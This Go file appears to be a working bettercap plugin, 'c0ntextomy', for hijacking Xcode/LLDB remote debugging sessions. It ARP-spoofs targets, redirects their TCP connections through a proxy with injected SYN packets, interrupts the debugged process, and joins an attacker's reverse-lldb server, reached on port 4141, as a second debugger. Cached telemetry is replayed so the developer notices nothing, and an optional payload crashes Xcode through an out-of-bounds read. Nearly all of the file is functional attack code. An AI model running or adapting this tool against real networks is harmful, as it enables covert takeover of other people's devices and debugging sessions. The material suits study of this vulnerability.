package main

import (
	"os"
	"fmt"
	"io"
	"net"
	"time"
	"bytes"
	"strings"
	"encoding/binary"

	"github.com/bettercap/bettercap/network"
	"github.com/bettercap/bettercap/packets"
	"github.com/bettercap/bettercap/firewall"
	bettercap_session "github.com/bettercap/bettercap/session"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/chifflier/nfqueue-go/nfqueue"
)

/***************************************************************
	For the exploit scroll down to "HandleSession" function
**************************************************************/


// types
type c0ntextomy struct {
	bettercap_session.SessionModule
	reverse_lldb_server				string
	addresses						[]net.IP
	profiling_packet_oob_example 	bool
}

type SessionState int
const (
	SessionStateNone = iota
	SessionStateLLDB
	SessionStateLLDBInterruptSent
	SessionStateLLDBInterrupted
	SessionStateLLDBHijacked
	SessionStateLLDBResumed
)

type ConnReadWriteCloser struct {
	read_writer 	io.ReadWriter
	conn 			net.TCPConn
	closed 			bool
}

type TCPProxySession struct {
	server 				*ConnReadWriteCloser
	client				*ConnReadWriteCloser
	attacker			*ConnReadWriteCloser
	state 				SessionState
	cached_telemetry	[]byte
}

type TCPProxy struct {
	redirection 	*firewall.Redirection
	local_address   *net.TCPAddr
	server_address	*net.TCPAddr
	listener    	*net.TCPListener
}


// globals
var mod *c0ntextomy

/*
	c0ntextomy Module

	Handle configuration and dependencies.
*/
func NewC0ntextomy(s *bettercap_session.Session) *c0ntextomy {
	mod = &c0ntextomy{
		SessionModule: 	bettercap_session.NewSessionModule("c0ntextomy", s),
		addresses:     	make([]net.IP, 0),
		profiling_packet_oob_example: false,
	}

	mod.SessionModule.Requires("packet.proxy")
	mod.SessionModule.Requires("arp.spoof")

	mod.AddParam(
		bettercap_session.NewStringParameter(
			"c0ntextomy.reverse_lldb_server",
			"",
			"",
			"IP Address to a reverse-lldb server.",
		),
	)

	mod.AddParam(
		bettercap_session.NewStringParameter(
			"c0ntextomy.targets",
			bettercap_session.ParamSubnet,
			"",
			"Comma separated list of IP addresses to spoof, also supports nmap style IP ranges.",
		),
	)

	mod.AddParam(
		bettercap_session.NewStringParameter(
			"c0ntextomy.whitelist",
			"",
			"",
			"Comma separated list of IP addresses to skip while spoofing.",
		),
	)

	mod.AddParam(
		bettercap_session.NewBoolParameter(
			"c0ntextomy.crash_xcode_profiling_packet_oob_example",
			"false",
			"If true, will cause Xcode to crash during device exploitation.",
		),
	)

	mod.AddHandler(
		bettercap_session.NewModuleHandler(
			"c0ntextomy on",
			"",
			"Start c0ntextomy proxy",
			func(args []string) error {
				return mod.Start()
			},
		),
	)

	mod.AddHandler(
		bettercap_session.NewModuleHandler(
			"c0ntextomy off",
			"",
			"Stop c0ntextomy proxy.",
			func(args []string) error {
				return mod.Stop()
			},
		),
	)

	return mod
}

/*
	Initializer called by golang on load

	We are loaded as a plugin by packet.proxy
	and hack our way to register ourselves as a
	legit bettercap module. mostly for convinience.
*/
func init() {
	bettercap_session.I.Register(NewC0ntextomy(bettercap_session.I))
}


func (mod c0ntextomy) Name() string {
	return "c0ntextomy"
}

func (mod c0ntextomy) Description() string {
	return 	"c0ntextomy module dynamically proxies all TCP connections between targets, detects active remote-gdb sessions and exploits them to allow a second client."
}

func (mod c0ntextomy) Author() string {
	return 	"Dany Lisiansky (@danyl931) and Nikias Bassen (@pimskeks)."
}

func (mod *c0ntextomy) IsTarget(address net.IP) bool {
	for _, entry := range mod.addresses {
        if entry.Equal(address) {
            return true
        }
    }

    return false
}

func (mod *c0ntextomy) Configure() error {
	var err error
	var targets string
	var whitelist string

	if err, mod.reverse_lldb_server = mod.StringParam("c0ntextomy.reverse_lldb_server"); err != nil || mod.reverse_lldb_server == "" {
		if err != nil {
			return err
		} else {
			return fmt.Errorf("Required parameter c0ntextomy.reverse_lldb_server is not set")
		}
	} else if err, targets = mod.StringParam("c0ntextomy.targets"); err != nil || targets == "" {
		if err != nil {
			return err
		} else {
			return fmt.Errorf("Required parameter c0ntextomy.targets is not set")
		}
	} else if err, whitelist = mod.StringParam("c0ntextomy.whitelist"); err != nil {
		return err
	} else if mod.addresses, _, err = network.ParseTargets(targets, mod.Session.Lan.Aliases()); err != nil {
		return err
	} else if err = mod.Session.Run("set arp.spoof.targets " + targets); err != nil {
		return err
	} else if err = mod.Session.Run("set arp.spoof.internal true"); err != nil {
		return err
	} else if whitelist != "" {
		if err = mod.Session.Run("set arp.spoof.whitelist " + whitelist); err != nil {
			return err
		}
	} else if err, mod.profiling_packet_oob_example = mod.BoolParam("c0ntextomy.crash_xcode_profiling_packet_oob_example"); err != nil {
		return err
	}

	return nil
}

func (mod *c0ntextomy) Start() error {
	if err := mod.Configure(); err != nil {
		return err
	}

	return mod.SetRunning(
		true,
		func() {
			for mod.Running() {
				/*
					Just a spinner.
					Not sure if we actually need a blocking
					loop here, but it wouldn't hurt.
					we should probably replace this with a semaphore.

					let the thread sleep from time to time
					so we won't hog the CPU for nothing.
				*/
				time.Sleep(1 * time.Second)
			}
		},
	)
}

func (mod *c0ntextomy) Stop() error {
	return mod.SetRunning(
		false,
		func() {
			if mod.Session.IsOn("packet.proxy") {
				if err := mod.Session.Run("packet.proxy off"); err != nil {
					mod.Error("Failed to disable packet.proxy: %s", err)
				}
			}

			if mod.Session.IsOn("arp.spoof") {
				if err := mod.Session.Run("arp.spoof off"); err != nil {
					mod.Error("Failed to disable arp.spoof: %s", err)
				}
			}
		},
	)
}


/*
	Connection abstraction
	Allowing to Read, Write and Close a connection
	Probably not the legit way to achieve this..
*/
func NewConnReadWriteCloser(conn *net.TCPConn) *ConnReadWriteCloser {
	conn.SetKeepAlive(true)
	return &ConnReadWriteCloser{
		read_writer: 		conn,
		conn: 				*conn,
		closed:				false,
	}
}

func (c *ConnReadWriteCloser) Read(p []byte) (int, error) {
	if c.closed {
		return 0, io.EOF
	}

	return c.read_writer.Read(p)
}

func (c *ConnReadWriteCloser) Write(p []byte) (int, error) {
	if c.closed {
		return 0, io.EOF
	}

	return c.read_writer.Write(p)
}

func (c *ConnReadWriteCloser) Close() error {
	if c.closed {
		return io.EOF
	}

	c.closed = true
	return c.conn.Close()
}

func (c *ConnReadWriteCloser) SetReadDeadline(t time.Time) error {
	return c.conn.SetReadDeadline(t)
}


func NewTCPProxySession(server *net.TCPConn, client *net.TCPConn) *TCPProxySession {
	session := &TCPProxySession{
		server:				NewConnReadWriteCloser(server),
		client: 			NewConnReadWriteCloser(client),
		attacker:			nil,
		state: 				SessionStateNone,
		cached_telemetry: 	nil,
	}

	// start pipeing
	go session.HandleSession(session.server)
	go session.HandleSession(session.client)

	return session
}

func (session *TCPProxySession) Close() {
	if session.server != nil {
		session.server.Close()
	}

	if session.client != nil {
		session.client.Close()
	}

	if session.attacker != nil {
		session.attacker.Close()
	}
}

func (session *TCPProxySession) ConnectionClosed(connection *ConnReadWriteCloser) {
	if session.server == connection || (session.client == connection && session.state != SessionStateLLDBHijacked) {
		// If the server is dead close the session
		session.Close()
	} else {
		connection.Close()
	}
}

/*
	To keep the client "happy" we are caching a telemetry
	packet and re-sending it while the session is hijacked
*/
func (session *TCPProxySession) CacheTelemetryPacket(telemetry_packet []byte) {
	mod.Info("Caching telemetry")
	session.cached_telemetry = make([]byte, len(telemetry_packet))
	copy(session.cached_telemetry, telemetry_packet)
}

func (session *TCPProxySession) SendCachedTelemetry() bool {
	if mod.profiling_packet_oob_example {
		/*
			DebuggerLLDB`.framework implements the logic to
			parse profiling packets (method `processProfileDataString:`
			of class 'DBGLLDBSession').

			There are multiple code paths in this logic which reliably
			cause Xcode to crash. From a brief look, none of the bugs
			were exploitable.

			This is an example which would trigger one of the buggy code paths:
			The logic creates 2 arrays to store 'thread_used_id'
			and 'thread_used_usec' entries. But when processing it'll assume
			they are both of the same size and iterate them based on the object
			count of the 'thread_used_id' array which will then cause an out of
			bounds read through the 'objectAtIndexedSubscript:' method of the array
			storing the 'thread_used_usec' entries.
		*/
		session.client.Write([]byte("$Anum_cpu:2;thread_used_id:41414;"))
		return true
	}

	// ignore if no cached telemetry found
	if session.cached_telemetry == nil {
		return true
	}

	if _, err := session.client.Write(session.cached_telemetry); err != nil {
		mod.Error("Failed to send cached telemetry: %s", err)
		return false
	}

	return true
}

/*
	Injects a process interrupt packet into an active session

	process interrupt in gdb-remote protocol is
	apparently the same as SIGQUIT, hence the 0x03.
*/
func (session *TCPProxySession) InjectProcessInterruptPacket() bool {
	mod.Info("Injecting process interrupt packet")
	if _, err := session.server.Write([]byte("\x03")); err != nil {
		mod.Error("Failed to inject process interrupt packet: %s", err)
		return false
	}

	return true
}

/*
	We are connecting to a server which will then
	pass the socket using the gdb-remote plugin
	through the fd:// url scheme.

	It works the same as connecting to a server using host:port,
	but instead of having gdb-remote initiate the connection
	the reverse-lldb server will pass an already connected socket.
*/
func (session *TCPProxySession) ConnectToReverseLLDBServer() bool {
	var err error
	var attacker net.Conn

	mod.Info("Connecting to a reverse-lldb server")
	if attacker, err = net.Dial("tcp", mod.reverse_lldb_server + ":4141"); err != nil {
		mod.Error("error while connecting to reverse-lldb server: %s", err)
		return false
	}

	session.attacker = NewConnReadWriteCloser(attacker.(*net.TCPConn))

	mod.Info("Sending session id")
	server_addr := session.server.conn.RemoteAddr().(*net.TCPAddr).String()
	err = binary.Write(
		session.attacker.read_writer,
		binary.LittleEndian,
		uint64(len(server_addr)),
	)

	if err != nil {
	    mod.Error("Failed to send tlv size to reverse-lldb server: %s", err)
	    return false
	} else if _, err = session.attacker.Write([]byte(server_addr)); err != nil {
	    mod.Error("Failed to send tlv payload to reverse-lldb server: %s", err)
	    return false
	}

	go session.HandleSession(session.attacker)
	return true
}

/*
	Handle second gdb-remote client handshake

	gdb-remote protocol defines a one-time handshake
	between the client and the server.

	In order to accept a second connection on an
	active session we need to handle this manually.
*/
func (session *TCPProxySession) HandleGDBRemoteHandshake() bool {
	if _, err := session.attacker.Write([]byte("+$OK#9a")); err != nil {
		mod.Error("Failed to send gdb-remote OK packet during attacker handshake: %s", err)
		return false
	}

	ack := make([]byte, 0x1)
	ack[0] = 0
	if _, err := session.attacker.Read(ack); err != nil {
		mod.Error("Failed to receive gdb-remote ack packet during attacker handshake: %s", err)
		return false
	}

	if ack[0] != '+' {
		mod.Error("Invalid gdb-remote ack response during attacker handshake: %c", ack[0])
		return false
	}

	return true
}

/*
	Injects a process continue packet

	When the second client detaches it leaves the process stopped
	and we need to resume it back to a running state.
*/
func (session *TCPProxySession) InjectProcessContinuePacket() bool {
	mod.Info("Injecting process continue packet")
	if _, err := session.server.Write([]byte("$c#63")); err != nil {
		mod.Error("Failed to inject process continue packet: %s", err)
		return false
	}

	return true
}

/*
	Handle proxied session

	Here we have full control over the session and is where we deliver
	our exploit to allow a second gdb-remote client to join the session.

	The exploit flow is as follows:
	1) 		Detect gdb-remote protocol by looking for
			a QStartNoAckMode packet sent by the client.

	2.1)	Wait for the first telemetry packet (refered as 'profiling'
			packet in lldb) by looking for "host_user_ticks"
			substring in the packet sent by the server.

	2.2)	Inject process interrupt packet to server.

	2.3)	Cache first telemetry packet for later use.

	2.4)	Wait for server to finish sending back process state packets.

	3) 		Connect to the reverse-lldb server and join
			the attacker to the session.

	4)	 	Detect the new client by looking for another QStartNoAckMode
			packet and manually handle handhsake.

	5.1)	Pipe server <-> attacker connections.

	5.2)	For each packet sent by attacker, send the cached telemetry
			packet from step 2.3 to the client.

	5.3)	Ignore packets sent by the client.

	6)		Wait for a detach packet from attacker and reply
			with an OK packet to exit the session cleanly.

	7)		Resume process by sending a continue packet to the server.

	8)	 	Resume server <-> client connections pipe.
*/
func (session *TCPProxySession) HandleSession(src *ConnReadWriteCloser) {
	var err error

	// buffer to hold received data
	buffer := make([]byte, 0xffff)

	/*
		we count total bytes sent by a connection
		to limit detection scope of QStartNoAckMode
		packets to the start of the session.
	*/
	total_bytes_received := 0

	// Current packet size
	packet_size := 0

	for {
		// Set server read timeout for gdb-remote sessions
		if session.server == src && session.state != SessionStateNone {
			src.SetReadDeadline(time.Now().Add(3 * time.Second))
		}

		// Read packet
		if packet_size, err = src.Read(buffer); err != nil {

			/*
				If we recevied a timeout and packet size
				is not 0, continue as usual.

				Otherwise if we are waiting for a process
				interrupt completion, join the attacker
				to the session and continue.
			*/
			if os.IsTimeout(err) {
				if packet_size == 0 {
					if session.server == src && session.state == SessionStateLLDBInterruptSent {
						/*
							 --- Exploit step 3 ---
							 Process interrupted, connect to the reverse-lldb
							 server and join attacker to the session.
						*/
						
						mod.Info("Interrupted, Hijacking")
						session.state = SessionStateLLDBInterrupted
						if session.ConnectToReverseLLDBServer() == false {
							/*
								Failed, we need to resume the process and
								rejoin the client back to the session.
							*/
							if session.InjectProcessContinuePacket() {
								mod.Info("Session recovered")
								session.state = SessionStateLLDBResumed
							} else {
								// Server is dead?
								mod.Error("Failed to recover, closing session")
								session.Close()
								return
							}
						}
					}

					// We have nothing to process
					continue
				}
			} else {
				if err.Error() != "EOF" && !strings.Contains(err.Error(), "use of closed network connection") {
					// Log unknown errors
					mod.Error("Connection read failed: %s", err)
				}

				/*
					Use ConnectionClosed to check which connection
					was closed and properly handle cleanup.
				*/
				session.ConnectionClosed(src)
				return
			}
		}

		total_bytes_received += packet_size
		packet := buffer[:packet_size]

		if session.server == src {
			// Handle server connection

			/*
				--- Exploit step 2.1 ---
				Detect first telemetry packet
			*/
			if session.state == SessionStateLLDB && bytes.Contains(packet, []byte("host_user_ticks")) {
				mod.Info("Found first telemetry packet")

				/*
					--- Exploit step 2.2 ---
					Inject a process interrupt packet
				*/
				if session.InjectProcessInterruptPacket() {
					/*
						--- Exploit step 2.3 ---
						Cache the packet and set the new state.
					*/

					session.CacheTelemetryPacket(packet)
					session.SendCachedTelemetry()
					session.state = SessionStateLLDBInterruptSent
					continue
				} else {
					// Server is dead?
					session.Close()
					return
				}
			} else if session.state == SessionStateLLDBInterruptSent {
				/*
					--- Exploit step 2.4 ---
					Ignore state packets sent by
					server when intrrupted.
				*/
				continue
			} else if session.state == SessionStateLLDBHijacked {
				// Send server packet to attacker
				if _, err = session.attacker.Write(packet); err != nil {
					// attacker dead?

					mod.Error("Failed to send packet from server to attacker: %s", err)
					session.attacker.Close()

					// Try to recover by sending a continue packet
					if session.InjectProcessContinuePacket() {
						mod.Info("Session recovered")
						session.state = SessionStateLLDBResumed
						continue
					} else {
						// server dead too? We can't recover from this.
						mod.Error("Failed to recover, closing session")
						session.Close()
						return
					}
				} else {
					/*
						--- Exploit step 5.2 ---
						Send a cached telemetry packet to
						the client to keep it happy.

						Ignore errors.
						We want to proceed even if client is dead.
					*/
					session.SendCachedTelemetry()
				}

				continue
			}


			// Send server packet to client
			if _, err = session.client.Write(packet); err != nil {
				mod.Error("Failed to send packet from server to client: %s", err)

				/*
					If the client is dead at this stage
					we have to close the session.
				*/
				session.Close()
				return
			}
		} else {
			// Handle clients

			if session.state == SessionStateLLDBHijacked {

				if session.client == src {
					/*
						---Exploit step 5.3 ---
						Ignore packets from client when hijacked
					*/
					continue
				} else if packet[0] == '$' && packet_size > 1 && packet[1] == 'D' {
					/*
						--- Exploit step 6 ---
						This is a detach packet.
						Close the attacker session cleanly.
					*/

					mod.Info("Detaching attacker")
					src.Write([]byte("$OK#00"))
					src.Close()

					/*
						--- Exploit step 7 ---
						Inject a continue packet to resume process
					*/
					if session.InjectProcessContinuePacket() {
						/*
							--- Exploit step 8 ---
							Resume server <-> client session
						*/
						mod.Info("Session resumed")
						session.state = SessionStateLLDBResumed
					} else {
						// server is dead?
						mod.Error("Failed to resume session")
						session.Close()
					}


					return
				}
			} else if total_bytes_received <= 0x600 && bytes.Contains(packet, []byte("QStart")) {
				/*
					This is a QStartNoAckMode packet.
					Indicating us a new gdb-remote
					session has been started.
				*/

				if session.state == SessionStateNone {
					/*
						--- Exploit step 1 ---
						Detected a gdb-remote session
						between the server and the client.
					*/
					mod.Info("Found a new gdb-remote session")
					session.state = SessionStateLLDB
				} else if session.state == SessionStateLLDBInterrupted {
					/*
						--- Exploit step 4 ---
						We were waiting for the process to interrupt
						which means this is the attacker trying to connect.

						Accept the the second client by
						handling the handshake manually.
					*/
					mod.Info("Attacker joined the session")
					if session.HandleGDBRemoteHandshake() == false {
						/*
							We failed to complete the handshake
							Disconnect attacker and try to recover
						*/
						src.Close()

						if session.InjectProcessContinuePacket() {
							// Resume server <-> client session
							mod.Info("Session recovered")
							session.state = SessionStateLLDBResumed
						} else  {
							// We failed to recover, kill the session
							mod.Error("Failed to recover, close session")
							session.Close()
						}

						return
					}

					/*
						 --- Exploit step 5.1 ---
						 Start piping server <-> attacker
					*/
					session.state = SessionStateLLDBHijacked
					mod.Info("Completed attacker handshake, the session is now hijacked.")
					continue
				}
			}

			// Send packet to server
			if _, err = session.server.Write(packet); err != nil {
				// server is dead?

				mod.Error("Failed to send packet to server, closing session: %s", err)
				session.Close()
				return
			}

			// Close attacker if the session is resumed
			if session.attacker == src && session.state == SessionStateLLDBResumed {
				session.attacker.Close()
				return
			}
		}
	}
}


/*
	Initializes a new tcp proxy

	We first try to connect to the server since lockdownd can
	spawn ports dynamically on request and the
	client may try to connect to a closed port.

	Once we have a connection to the server we setup our listener
	which will be used to accept new connections from our target,
	redirected through a firewall rule we register right after.
*/
func NewTCPProxy(server_ip string, server_port int) *TCPProxy {
	var err error
	var server_address *net.TCPAddr
	var server *net.TCPConn
	var listener net.Listener

	if server_address, err = net.ResolveTCPAddr("tcp", fmt.Sprintf("%s:%d", server_ip, server_port)); err != nil {
		return nil
	} else if server, err = net.DialTCP("tcp", nil, server_address); err != nil {
		return nil
	} else if listener, err = net.Listen("tcp", mod.Session.Interface.IpAddress + ":0"); err != nil {
		server.Close()
		return nil
	}

	proxy := &TCPProxy{
		server_address: server_address,
		local_address: 	listener.Addr().(*net.TCPAddr),
		listener:		listener.(*net.TCPListener),
	}

	proxy.redirection = firewall.NewRedirection(
		mod.Session.Interface.Name(),
		"TCP",
		server_port,
		mod.Session.Interface.IpAddress,
		proxy.local_address.Port,
	)

	proxy.redirection.SrcAddress = server_ip

	if err = mod.Session.Firewall.EnableRedirection(proxy.redirection, true); err != nil {
		server.Close()
		proxy.listener.Close()
		mod.Error("Failed to enable redirection: %s", err)
		return nil
	}

	go proxy.Run(server)
	return proxy
}


/*
	Accepts new connections and creates a tcp proxy
	session to handle the required piping.

	If we hit any error, close sockets and
	remove the firewall redirection rule.
*/
func (proxy *TCPProxy) Run(server *net.TCPConn) {
	var err error
	var client *net.TCPConn

	for {
		client, err = proxy.listener.AcceptTCP()
		if err == nil && server == nil {
			server, err = net.DialTCP("tcp", nil, proxy.server_address)
		}

		if err != nil {
			if server != nil {
				server.Close()
			}

			if client != nil {
				client.Close()
			}

			break
		}

		mod.Info("Proxying %s <-> %s <-> %s",
			client.RemoteAddr().String(),
			proxy.local_address.String(),
			server.RemoteAddr().String(),
		)

		NewTCPProxySession(server, client)
		server = nil
		client = nil
	}

	proxy.listener.Close()
	if err = mod.Session.Firewall.EnableRedirection(proxy.redirection, false); err != nil {
		mod.Error("Failed to disable redirection: %s", err)
	}
}


/*
	Injects a replicated TCP packet with an arbitrary destination
	port and an Ethernet layer which points back to us.

	Together with the firewall redirection rule initialized
	by the proxy it allows us to redirect the connection
	back to a server in our position.
*/
func injectTCPPacket(ip4 *layers.IPv4, tcp *layers.TCP, dest_port int) bool {
	eth := layers.Ethernet{
		SrcMAC:       mod.Session.Interface.HW,
		DstMAC:       mod.Session.Interface.HW,
		EthernetType: layers.EthernetTypeIPv4,
	}

	ip4_new := layers.IPv4{
		Protocol: layers.IPProtocolTCP,
		Version:  4,
		TTL:      64,
		SrcIP:    ip4.SrcIP,
		DstIP:    ip4.DstIP,
	}

	tcp_new := layers.TCP{
		SrcPort: tcp.SrcPort,
		DstPort: layers.TCPPort(dest_port),
		Seq:     tcp.Seq,
		Ack:     tcp.Ack,
		SYN:     true,
	}

	tcp_new.SetNetworkLayerForChecksum(&ip4_new)

	if err, payload := packets.Serialize(&eth, &ip4_new, &tcp_new); err == nil {
		return mod.Session.Queue.Send(payload) == nil
	}

	return false
}


/*
	Callback called by packet.proxy

	Basically an NFQUEUE filter which allows us to inspect
	packets and decide whether to drop or accept them.
*/
func OnPacket(payload *nfqueue.Payload) int {
	var ok bool
	var ip_layer *layers.IPv4
	var tcp_layer *layers.TCP
	var proxy *TCPProxy

	packet := gopacket.NewPacket(
		payload.Data,
		layers.LayerTypeIPv4,
		gopacket.Default,
	)

	// get ipv4 layer
	_ip_layer := packet.Layer(layers.LayerTypeIPv4)
	if ok = _ip_layer != nil; ok {
		ip_layer, ok = _ip_layer.(*layers.IPv4)
	}

	// handle only connections between our targets
	if !ok || !mod.IsTarget(ip_layer.SrcIP) || !mod.IsTarget(ip_layer.DstIP) {
		payload.SetVerdict(nfqueue.NF_ACCEPT)
		return 0;
	}

	// get tcp layer
	_tcp_layer := packet.Layer(layers.LayerTypeTCP)
	if ok = _tcp_layer != nil; ok {
		tcp_layer, ok = _tcp_layer.(*layers.TCP)
	}

	// handle only tcp syn packets
	if !ok || !tcp_layer.SYN || tcp_layer.ACK {
		payload.SetVerdict(nfqueue.NF_ACCEPT)
		return 0;
	}

	// create proxy
	if proxy = NewTCPProxy(ip_layer.DstIP.String(), int(tcp_layer.DstPort)); proxy == nil {
		payload.SetVerdict(nfqueue.NF_ACCEPT)
		return 0;
	}

	// inject new packet to redirect the connection back to our proxy
	if !injectTCPPacket(ip_layer, tcp_layer, proxy.local_address.Port) {
		proxy.listener.Close()
		payload.SetVerdict(nfqueue.NF_ACCEPT)
		return 0;
	}

	// If we successfully injected a replacement packet, drop the original one.
	payload.SetVerdict(nfqueue.NF_DROP)
	return 0;
}
